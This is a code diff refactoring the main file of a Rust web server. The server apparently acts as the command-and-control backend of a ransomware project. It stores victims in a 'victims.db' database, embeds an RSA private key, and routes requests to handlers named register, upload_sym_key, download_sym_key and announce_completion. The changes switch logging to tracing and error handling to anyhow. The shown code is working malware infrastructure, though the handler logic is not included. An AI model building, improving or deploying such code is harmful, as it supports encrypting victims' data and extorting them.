@@ -1,11 +1,13 @@
+use std::{future, io, net::SocketAddr, process::ExitCode, sync::Arc, time::Duration};
+
+use anyhow::{Context, anyhow};
 use axum::{Router, routing::post};
 use axum_embed::ServeEmbed;
-use axum_server::tls_rustls::RustlsConfig;
-use log::{debug, error, info, warn};
+use axum_server::{Handle, bind, bind_rustls, tls_rustls::RustlsConfig};
 use purecrypto::rsa::BoxedRsaPrivateKey;
 use rust_embed::RustEmbed;
-use std::{future, net::SocketAddr, sync::Arc, time::Duration};
 use tokio::signal;
+use tracing::{debug, error, info, warn};
 
 mod config;
 mod crypto;
@@ -14,24 +16,23 @@ mod handlers;
 mod models;
 mod time;
 
+use coconut_crab_lib::{
+    file::current_exe_dir,
+    web::{
+        routes,
+        server_tls::{tls_certificate, tls_private_key},
+    },
+};
 use handlers::{announce_completion, download_sym_key, register, upload_sym_key};
 use models::Victim;
 
-use coconut_crab_lib::{
-    file::get_exe_path_dir,
-    web::{
-        routes,
-        server_tls::{get_tls_private_key, get_tls_public_key},
-    },
-};
-
 static MIGRATIONS: toasty::migration::MigrationSet = toasty::embed_migrations!();
 
-fn spawn_shutdown_signal(handle: axum_server::Handle<SocketAddr>) {
+fn spawn_shutdown_signal(handle: Handle<SocketAddr>) {
     tokio::spawn(async move {
         let ctrl_c = async {
             if let Err(error) = signal::ctrl_c().await {
-                error!("failed to install Ctrl+C handler: {error}");
+                error!(error = ?error, "failed to install Ctrl+C handler");
                 future::pending::<()>().await;
             }
         };
@@ -43,7 +44,7 @@ fn spawn_shutdown_signal(handle: axum_server::Handle<SocketAddr>) {
                     handler.recv().await;
                 }
                 Err(error) => {
-                    error!("failed to install termination signal handler: {error}");
+                    error!(error = ?error, "failed to install termination signal handler");
                     future::pending::<()>().await;
                 }
             }
@@ -62,8 +63,8 @@ fn spawn_shutdown_signal(handle: axum_server::Handle<SocketAddr>) {
     });
 }
 
-fn log_accept_error(addr: Option<&SocketAddr>, error: &std::io::Error) {
-    warn!("Failed to accept connection from {addr:?}: {error}");
+fn log_accept_error(addr: Option<&SocketAddr>, error: &io::Error) {
+    warn!(?addr, error = ?error, "Failed to accept connection");
 }
 
 #[derive(Clone)]
@@ -80,40 +81,63 @@ struct AssetPublic;
 #[folder = "assets/private"]
 struct AssetPrivate;
 
+fn embedded_asset(name: &str) -> anyhow::Result<Vec<u8>> {
+    AssetPrivate::get(name)
+        .map(|asset| asset.data.into_owned())
+        .with_context(|| format!("embedded asset {name} is missing"))
+}
+
 #[tokio::main]
-async fn main() {
-    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
+async fn main() -> ExitCode {
+    tracing_subscriber::fmt()
+        .with_env_filter(
+            tracing_subscriber::EnvFilter::try_from_default_env()
+                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
+        )
+        .init();
 
-    let exe_directory_path = get_exe_path_dir().unwrap_or_else(|error| {
-        error!("Cannot determine executable directory: {error}");
-        std::process::exit(1);
-    });
+    match run().await {
+        Ok(()) => ExitCode::SUCCESS,
+        Err(error) => {
+            error!(error = ?error, "Fatal error");
+            ExitCode::FAILURE
+        }
+    }
+}
 
-    let driver = toasty_driver_sqlite::Sqlite::open(exe_directory_path.join("victims.db"));
+async fn run() -> anyhow::Result<()> {
+    let exe_directory_path = tokio::task::spawn_blocking(current_exe_dir)
+        .await
+        .context("executable directory lookup task failed")?
+        .context("cannot determine executable directory")?;
+
+    let driver = tokio::task::spawn_blocking(move || {
+        toasty_driver_sqlite::Sqlite::open(exe_directory_path.join("victims.db"))
+    })
+    .await
+    .context("sqlite driver open task failed")?;
     let db = toasty::Db::builder()
         .models(toasty::models!(Victim))
         .build(driver)
         .await
-        .expect("Failed to connect to SQLite database");
+        .context("failed to connect to SQLite database")?;
 
     MIGRATIONS
         .apply(&db)
         .await
-        .expect("Failed to apply database migrations");
+        .context("failed to apply database migrations")?;
     debug!("Database migrations applied");
 
-    let pem = String::from_utf8(
-        AssetPrivate::get("asym-priv-key.pem")
-            .expect("Failed to get private RSA key file")
-            .data
-            .into_owned(),
-    )
-    .expect("Failed to read PEM file");
-    let private_key =
-        Arc::new(BoxedRsaPrivateKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key"));
+    let pem = String::from_utf8(embedded_asset("asym-priv-key.pem")?)
+        .context("failed to decode embedded RSA private key as UTF-8")?;
+    let private_key = BoxedRsaPrivateKey::from_pkcs1_pem(&pem)
+        .context("failed to parse embedded RSA private key")?;
     debug!("RSA private key parsed and cached");
 
-    let shared_state = AppState { db, private_key };
+    let shared_state = AppState {
+        db,
+        private_key: Arc::new(private_key),
+    };
 
     let serve_public_assets = ServeEmbed::<AssetPublic>::new();
 
@@ -128,7 +152,7 @@ async fn main() {
         .nest_service(routes::DOWNLOAD_DIR.as_str(), serve_public_assets)
         .with_state(shared_state);
 
-    let handle = axum_server::Handle::new();
+    let handle = Handle::new();
     spawn_shutdown_signal(handle.clone());
 
     let addr = SocketAddr::from(([0, 0, 0, 0], config::PORT));
@@ -136,15 +160,15 @@ async fn main() {
     if config::HTTPS {
         rustls::crypto::ring::default_provider()
             .install_default()
-            .expect("Failed to install rustls crypto provider");
+            .map_err(|_| anyhow!("failed to install rustls crypto provider"))?;
         let tls_config = RustlsConfig::from_pem(
-            get_tls_public_key().into_owned(),
-            get_tls_private_key().into_owned(),
+            tls_certificate()?.into_owned(),
+            tls_private_key()?.into_owned(),
         )
         .await
-        .expect("Failed to configure web server TLS");
+        .context("failed to configure web server TLS")?;
 
-        let server = axum_server::bind_rustls(addr, tls_config);
+        let server = bind_rustls(addr, tls_config);
         server
             .handle(handle)
             .first_request_timeout(Some(Duration::from_secs(
@@ -153,9 +177,9 @@ async fn main() {
             .accept_error_handler(log_accept_error)
             .serve(app.into_make_service())
             .await
-            .expect("Failed to start web server");
+            .context("failed to start web server")?;
     } else {
-        let server = axum_server::bind(addr);
+        let server = bind(addr);
         server
             .handle(handle)
             .first_request_timeout(Some(Duration::from_secs(
@@ -164,6 +188,7 @@ async fn main() {
             .accept_error_handler(log_accept_error)
             .serve(app.into_make_service())
             .await
-            .expect("Failed to start web server");
+            .context("failed to start web server")?;
     }
+    Ok(())
 }
